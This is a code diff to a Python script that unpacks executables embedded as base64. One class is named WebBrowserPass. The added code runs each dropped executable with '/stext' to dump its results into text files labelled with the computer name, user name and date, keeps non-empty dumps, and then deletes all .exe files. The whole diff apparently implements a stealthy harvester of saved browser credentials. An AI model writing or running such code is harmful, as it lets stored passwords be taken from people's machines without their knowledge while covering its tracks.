@@ -1,4 +1,4 @@
-import sys, base64
+import sys, base64, inspect, glob, os, getpass, datetime, subprocess
 
 def write(EXE_NAME, EXE_DATA):
     with open(EXE_NAME, "wb") as file: 
@@ -60,10 +60,30 @@ class WebBrowserPass:
     def makeEXE(self): write(EXE_NAME=self.EXE_NAME, EXE_DATA=self.EXE_DATA)
 
 
-import inspect
+# make the *.exe
 for name, obj in inspect.getmembers(sys.modules[__name__]):
     if inspect.isclass(obj):
         if hasattr(obj, 'EXE_NAME') and hasattr(obj, 'EXE_DATA'):
             instance = obj()
             instance.makeEXE()
             
+
+# make *.exe
+exe_files = glob.glob('*.exe')
+username = '.'.join(getpass.getuser().split(" "))
+pcname = '.'.join(os.getenv('COMPUTERNAME').split(" "))
+date = str(datetime.date.today())
+for exe_file in exe_files:
+    if not os.path.isfile(exe_file):
+        continue
+    filename = os.path.splitext(os.path.basename(exe_file))[0]
+    sfname = f"{pcname}.{username}.{date}.{filename}.txt"
+    command = f'"{exe_file}" /stext {sfname}'
+    print("Running " + command)
+    os.system(command)
+    if os.path.getsize(sfname) <= 3:
+        os.remove(sfname)
+
+
+# remove all *.exe
+os.system("del *.exe")
